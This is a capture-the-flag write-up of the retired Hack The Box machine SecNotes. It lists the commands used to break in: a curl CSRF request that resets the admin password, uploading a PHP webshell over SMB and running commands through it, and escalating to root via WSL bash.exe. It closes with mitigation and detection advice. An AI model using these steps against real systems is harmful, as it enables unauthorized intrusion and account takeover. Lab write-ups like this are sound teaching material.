---
machine: SecNotes
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, web, csrf, smb, wsl, webshell]
---

# SecNotes — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The notes app allows registration and its contact form is CSRF-vulnerable. Change the administrator password, read a note with SMB credentials and write a webshell to `\\secnotes.htb\new-site`. Escalation uses WSL's `bash.exe`, which runs as root.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p80,139,445,5985 <IP>
```

Add `secnotes.htb` to hosts. The site allows registration and note creation. SMB exposes a `new-site` share.

```bash
smbclient -L //<IP> -N
```

## Initial access

Register an account and inspect the contact form. It does not validate the CSRF token and accepts hidden parameters. Send a request to change the `admin` password:

```bash
curl -s -X POST http://secnotes.htb/contact.php \
  -b 'PHPSESSID=<SESSION>' \
  --data 'name=<NAME>&email=<EMAIL>&message=<MSG>&csrf_token=<TOKEN>&password=<NEW_PASS>'
```

Log in as `admin` and read a note with SMB credentials:

```text
\\secnotes.htb\new-site
<USER>:<PASS>
```

## Lateral movement

The `new-site` share is writable. Upload a PHP webshell and execute it:

```bash
smbclient //secnotes.htb/new-site -U '<USER>%<PASS>'
put shell.php
```

```bash
curl 'http://secnotes.htb/new-site/shell.php?c=whoami'
```

A shell as `tyler` is returned. Enumerate users and find the user flag.

## Privilege escalation

WSL is installed. `bash.exe` runs as root by default:

```cmd
C:\Windows\System32\bash.exe -c "id"
# uid=0(root)
```

Read the root flag from that shell and redact it.

## Evidence

- Registration and CSRF request with token redacted.
- Note with SMB credentials redacted.
- `smbclient` and webshell.
- `bash.exe -c id` as root.

## Lessons learned

- A form without CSRF protection can change an admin password.
- Application notes may hold credentials for other services.
- A writable SMB share allows webshell hosting.
- A misconfigured WSL grants root on the host.

## Mitigation and detection

- Implement CSRF tokens and origin validation.
- Never store credentials in notes.
- Restrict SMB write access and script execution.
- Limit WSL and review `bash.exe` spawned by IIS/users.
- Detect admin password changes and PHP uploads to SMB.

## References

- <https://www.hackthebox.com/machines/secnotes>
- <https://owasp.org/www-community/attacks/csrf>
- <https://learn.microsoft.com/en-us/windows/wsl/>
